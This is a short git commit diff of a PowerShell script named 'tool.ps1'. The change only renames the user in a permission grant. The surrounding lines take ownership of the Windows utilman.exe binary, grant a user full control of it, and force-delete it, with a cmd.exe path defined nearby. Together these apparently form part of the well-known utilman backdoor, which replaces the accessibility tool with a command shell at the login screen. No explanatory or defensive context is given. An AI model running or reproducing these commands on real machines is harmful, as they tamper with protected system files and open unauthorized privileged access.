c7088183db88ae05ce2c8322aa6050dba25e991f
marcusforsberg-truesec <marcus.forsberg@truesec.se>
2024-10-09 14:00:57 +0200

    Update tool.ps1

--- tool.ps1
+++ tool.ps1
@@ -4,7 +4,7 @@ $cmdPath = "C:\Windows\System32\cmd.exe"
 
 # Take ownership of utilman.exe
 takeown /f $utilmanPath
-icacls $utilmanPath /grant bob:F
+icacls $utilmanPath /grant alice:F
 
 # Remove utilman.exe
 Remove-Item $utilmanPath -Force
